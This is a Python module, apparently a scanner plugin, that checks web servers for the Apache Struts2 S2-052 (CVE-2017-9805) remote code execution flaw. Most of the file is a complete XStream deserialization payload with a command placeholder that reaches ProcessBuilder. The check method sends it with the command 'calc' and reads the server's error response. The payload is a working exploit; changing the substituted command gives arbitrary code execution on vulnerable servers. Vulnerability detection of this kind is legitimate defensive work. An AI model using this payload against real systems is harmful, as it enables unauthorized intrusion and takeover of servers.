#!/usr/bin/env python3

from app.lib.request import request
from app.lib.common import get_capta, get_useragent

class S2_052_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'S2-052漏洞,又名CVE-2017-9805漏洞',
            'description': 'Struts2 Remote Code Execution Vulnerability, Struts 2.1.6 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12',
            'date': '2017-09-05',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.capta = get_capta()
        
        self.headers = {
            'User-Agent': get_useragent(),
            'Content-Type': "application/xml",
        }
        self.payload ='''
                    <map>
                        <entry>
                            <jdk.nashorn.internal.objects.NativeString>
                            <flags>0</flags>
                            <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
                                <dataHandler>
                                <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                                    <is class="javax.crypto.CipherInputStream">
                                    <cipher class="javax.crypto.NullCipher">
                                        <initialized>false</initialized>
                                        <opmode>0</opmode>
                                        <serviceIterator class="javax.imageio.spi.FilterIterator">
                                        <iter class="javax.imageio.spi.FilterIterator">
                                            <iter class="java.util.Collections$EmptyIterator"/>
                                            <next class="java.lang.ProcessBuilder">
                                            <command>
                                                {cmd}
                                            </command>
                                            <redirectErrorStream>false</redirectErrorStream>
                                            </next>
                                        </iter>
                                        <filter class="javax.imageio.ImageIO$ContainsFilter">
                                            <method>
                                            <class>java.lang.ProcessBuilder</class>
                                            <name>start</name>
                                            <parameter-types/>
                                            </method>
                                            <name>foo</name>
                                        </filter>
                                        <next class="string">foo</next>
                                        </serviceIterator>
                                        <lock/>
                                    </cipher>
                                    <input class="java.lang.ProcessBuilder$NullInputStream"/>
                                    <ibuffer></ibuffer>
                                    <done>false</done>
                                    <ostart>0</ostart>
                                    <ofinish>0</ofinish>
                                    <closed>false</closed>
                                    </is>
                                    <consumed>false</consumed>
                                </dataSource>
                                <transferFlavors/>
                                </dataHandler>
                                <dataLen>0</dataLen>
                            </value>
                            </jdk.nashorn.internal.objects.NativeString>
                            <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
                        </entry>
                        <entry>
                            <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
                            <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
                        </entry>
                    </map>
                '''
        
    async def check(self):

        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            self.check_payload = self.payload.format(cmd = '<string>calc</string>')
            check_req = await request.post(self.url, headers = self.headers, data = self.check_payload)
            if check_req.status == 500 and 'java.security.Provider$Service' in await check_req.text():
                return True
            
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    S2_052 = S2_052_BaseVerify('http://127.0.0.1:8088/struts2_rest_showcase_war_exploded/orders/3')